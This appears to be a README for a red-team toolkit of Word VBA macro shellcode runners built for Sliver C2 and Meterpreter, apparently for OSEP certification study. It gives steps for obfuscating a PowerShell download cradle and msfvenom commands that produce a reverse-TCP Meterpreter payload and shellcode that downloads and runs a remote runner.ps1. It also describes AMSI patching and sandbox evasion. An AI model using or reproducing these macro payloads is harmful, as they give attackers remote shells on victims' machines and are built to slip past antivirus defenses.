# Macro Shellcode Runners

## References
https://github.com/hackinaggie/OSEP-Tools-v2/tree/main/Macros
Most of the the tools are from hackinaggie's OSEP-Tools-v2 and customized in some ways to work with Sliver C2
Another shout out to Cyb3rDudu for MacroSliver https://github.com/Cyb3rDudu/MacroSliver
This allows the use of https sliver profile that leverages the process hollowing shellcode runner. 

# Sliver Macro
The following VBA Macros contains a powershell cradle intended for runner.ps1 within ToolLibrary/sliver-setup

## References
Macro Obfuscator: ToolLibrary/Macro/sliver-vbaMacroObfuscator.ps1
VBS Macro: ToolLibrary/Macro/sliver-vbaWordPsCradle.vbs

## Usage
```bash
# Use the vbaMacroObfuscator to obfuscate the powershell code eunner, the minmgmts, win32_process method value and docm file name. 
┌──(kali㉿kali)-[/opt/ToolLibrary/Macro]
└─$ pwsh ./sliver-vbaMacroObfuscator.ps1                                                                    

# Update output of Apples > sliver-vbaWordPsCradle.vbs on line 48

# Update the output of Win32 WMI Provider (winmgmts:) > sliver-vbaWordPsCradle.vbs on line 51 GetObject(Yellow("131117122121115121128127070"))

# Update the output of Win32_Process.Create() Method value > sliver-vbaWordPsCradle.vbs on line 51 Get(Yellow("099117122063062107092126123111113127127"))

# Update Name of docm > sliver-vbaWordPsCradle.vbs on line 44
```

## Sliver (HTTPS) Macro
Reference - https://github.com/Cyb3rDudu/MacroSliver


## WordMacro.vbs
Reference: https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/WordMacroRunnerBasic.vbs

This is just a basic version of WordMacroRunner.vbs without AMSI Bypass or IP Check.

Contains a meterpreter stageless payload that has obfuscation requested through msfvenom
```bash
┌──(kali㉿kali)-[/]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8080 EXITFUNC=thread --encrypt xor --encrypt-key a -f vbapplication 
```

## WordMacro+AMSI.vbs
Reference: https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/WordMacroRunner.vbs

This is a baseline runner that loads the shellcode into WINWORD.exe and executes it. Has capabilities to detect AMSI and patch it if found (for both 32-bit and 64 bit) as well as contains shellcode for both 32-bit and 64 bit Word so it can execute after detecting architecture.

Uses a sleep call to determine if being simulated by AV. Also has functionality to make sure the target is in the 192.168.0.0/16 IP range, except you have to uncomment it.

The shellcode is not obfuscated at all, that is left up to the reader. Much more can be done to obfuscate the entire script but if I did that here it would be hard to even understand the script, which would defeat its educational purpose.

```bash
┌──(kali㉿kali)-[/]
└─$ msfvenom -p windows/x64/exec -f vbapplication CMD="powershell.exe -c (new-object net.webclient).DownloadString('http://192.168.45.227/runner.ps1')" EXITFUNC=thread
```


